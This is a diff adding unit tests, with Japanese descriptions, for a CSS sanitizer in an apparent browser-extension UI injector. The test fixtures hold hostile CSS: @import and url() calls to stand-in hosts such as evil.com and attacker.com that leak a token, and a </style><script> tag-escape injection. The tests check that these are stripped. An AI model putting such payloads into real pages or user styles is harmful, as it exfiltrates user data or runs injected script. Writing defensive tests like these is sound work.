@@ -5,6 +5,7 @@ import {
   createTriggerRootWrapper,
   insertTriggerRoot,
   applyCustomCss,
+  sanitizeCustomCss,
 } from './ui-injector';
 import { NAV_SELECTORS } from './selectors';
 
@@ -87,6 +88,59 @@ describe('src/content/ui-injector.ts', () => {
 
       const updated = applyCustomCss('', false, styleEl, document);
       expect(updated?.textContent).toBe('');
+    });
+
+    it('危険な構文（@import, 外部url, </style>）が含まれる場合、サニタイズされて適用される', () => {
+      const maliciousCss = `
+        @import url("https://evil.com/leak.css");
+        body { background: url('https://attacker.com/token?val=123'); color: white; }
+        </style><script>alert(1)</script>
+      `;
+      const styleEl = applyCustomCss(maliciousCss, true, null, document);
+      expect(styleEl).not.toBeNull();
+      const content = styleEl?.textContent || '';
+      expect(content).not.toContain('@import url("https://evil.com/leak.css")');
+      expect(content).not.toContain('https://attacker.com/token');
+      expect(content).not.toContain('</style>');
+      expect(content).toContain('color: white');
+    });
+  });
+
+  describe('sanitizeCustomCss', () => {
+    it('安全な通常のCSSはそのまま通す', () => {
+      const css = 'body { margin: 0; padding: 10px; color: #fff; }';
+      const result = sanitizeCustomCss(css);
+      expect(result.isValid).toBe(true);
+      expect(result.safeCss).toBe(css);
+      expect(result.warnings.length).toBe(0);
+    });
+
+    it('@import ルールを検出・遮断する', () => {
+      const css = '@import "https://evil.com/style.css"; body { color: red; }';
+      const result = sanitizeCustomCss(css);
+      expect(result.isValid).toBe(false);
+      expect(result.safeCss).not.toContain('@import');
+      expect(result.warnings[0]).toContain('@import');
+    });
+
+    it('外部URL (http:, https:, //) への url() 参照を遮断する', () => {
+      const css = 'div { background-image: url("http://evil.com/steal"); }';
+      const result = sanitizeCustomCss(css);
+      expect(result.isValid).toBe(false);
+      expect(result.safeCss).not.toContain('http://evil.com');
+      expect(result.warnings[0]).toContain('external url');
+    });
+
+    it('</style> タグ脱出シーケンスを安全に無害化する', () => {
+      const css = 'a { color: blue; } </style><p>hacked</p>';
+      const result = sanitizeCustomCss(css);
+      expect(result.isValid).toBe(false);
+      expect(result.safeCss).not.toContain('</style>');
+      expect(result.safeCss).toContain('/* stripped style close tag */');
+    });
+
+    it('空文字列や空入力に対して安全に処理する', () => {
+      expect(sanitizeCustomCss('')).toEqual({ safeCss: '', isValid: true, warnings: [] });
     });
   });
 });
